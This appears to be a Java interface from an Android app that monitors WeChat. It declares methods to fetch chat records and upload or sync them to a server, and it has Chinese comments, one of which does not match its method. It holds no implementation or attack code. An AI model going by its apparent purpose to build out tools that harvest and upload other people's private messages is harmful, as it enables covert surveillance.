package com.samego.alic.monitor.wechat.wechatrecord.model;

import android.content.Context;

import com.samego.alic.monitor.wechat.wechatrecord.bean.ChatRecord;
import com.samego.alic.monitor.wechat.wechatrecord.model.listener.OnGetChatRecordListener;

import java.util.List;

public interface ChatRecordModel {
    /**
     * 获取联系人列表
     *
     * @param context  上下文
     * @param listener 监听
     */
    void getChatRecord(Context context, OnGetChatRecordListener listener);

    /**
     * 上传同步账号信息
     *
     * @param context 上下文
     * @param chatRecordList 聊天记录信息
     */
    void syncChatRecordMessage(Context context,List<ChatRecord> chatRecordList);
}
